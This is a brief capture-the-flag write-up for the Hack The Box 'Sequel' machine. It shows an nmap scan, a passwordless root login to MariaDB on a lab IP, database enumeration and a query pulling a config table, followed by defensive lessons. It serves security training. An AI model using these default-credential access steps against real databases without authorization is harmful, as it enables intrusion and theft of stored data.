# Sequel Machine - HTB

## Vulnerabilities
- Unauthenticated MySQL/MariaDB access
- Default root user without password
- Sensitive data stored in plain text

## Attack Chain

### 1. Reconnaissance
```bash
sudo nmap -sC -sV 10.129.215.113
```
Results: MariaDB 10.3.27 on port 3306

### 2. Database Connection
```bash
mariadb -h 10.129.215.113 -u root --skip-ssl
```

### 3. Database Enumeration
```sql
SHOW DATABASES;
USE htb;
SHOW TABLES;
```

### 4. Data Extraction
```sql
SELECT * FROM config;
```

## Lessons Learned
- Always check for default credentials
- Exposed databases are critical vulnerabilities
- Regular security audits needed for database access